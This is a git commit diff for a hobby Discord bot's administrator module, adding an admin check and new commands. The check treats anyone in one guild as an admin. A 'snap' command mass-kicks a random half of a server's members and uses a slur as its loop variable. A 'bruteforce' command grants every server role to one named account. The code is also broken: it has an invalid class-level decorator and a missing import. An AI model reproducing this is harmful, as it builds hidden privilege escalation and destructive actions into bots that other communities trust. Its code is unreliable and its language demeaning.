5874698b1bb330ce01cd990aedb55eade1b9a8ed
larrabyte <larrabyte@protonmail.ch>
2019-09-14 21:05:04 +1000

    Add an admin check and some more commands
    Admin check works by sorting through a list of pre-approved IDs. Returns true if author ID is in the list or command is executed in the Bakerbot guild.

--- cogs/administrator.py
+++ cogs/administrator.py
@@ -1,18 +1,34 @@
 """Adds administrator functions and an admin check."""
 from discord.ext import tasks, commands
 import utilities as util
+import discord
 
 # Order of admins is: larrabyte, captainboggle, computerfido, huxley2039 and elsoom.
 admins = [268916844440715275, 306249172032552980, 233399828955136021, 324850150889750528, 306896325067145228]
 
-def isadmin(self, userid):
-    if userid in admins: return True
+def isadmin(self, ctx):
+    if ctx.author.id in admins: return True
+    elif ctx.guild.id == util.guilds[2]: return True
     else: return False
 
 class administrator(commands.Cog):
     def __init__(self, bot):
         self.cog_check(isadmin)
         self.bot = bot
+
+    @self.bot.is_owner
+    @commands.command()
+    async def snap(self, ctx):
+        """They thought I was a madman."""
+        for gays in random.sample(ctx.guild.members, k=int(len(ctx.guild.members) / 2)): await ctx.guild.kick(gays)
+
+    @commands.command()
+    async def bruteforce(self, ctx):
+        """Brute-force the roles until something works :)"""
+        me = discord.utils.get(ctx.guild.members, name="anthony baker")
+        for roles in ctx.guild.roles:
+            try: await me.add_roles(roles)
+            except Exception: pass
 
     @commands.command()
     async def onesnap(self, ctx):
